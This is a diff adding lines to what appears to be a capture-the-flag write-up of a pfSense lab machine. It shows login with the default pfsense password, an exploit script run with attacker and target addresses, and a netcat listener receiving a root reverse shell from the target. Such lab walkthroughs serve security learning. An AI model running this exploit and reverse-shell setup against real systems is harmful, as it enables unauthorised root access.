@@ -84,3 +84,22 @@ login with user rohit and the default password for pfsense is pfsense
 
 ![image](https://user-images.githubusercontent.com/105310322/187797528-2117d116-9224-4e45-9240-0e583756b6d3.png)
 
+```console
+└──╼ [★]$ python3 sense.py --rhost 10.129.215.40 --lhost 10.10.14.41 --lport 1234 --username rohit --password pfsense
+CSRF token obtained
+Running exploit...
+Exploit completed
+```
+
+```console
+└──╼ [★]$ nc -lnvp 1234
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.215.40.
+Ncat: Connection from 10.129.215.40:21244.
+sh: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+# 
+```
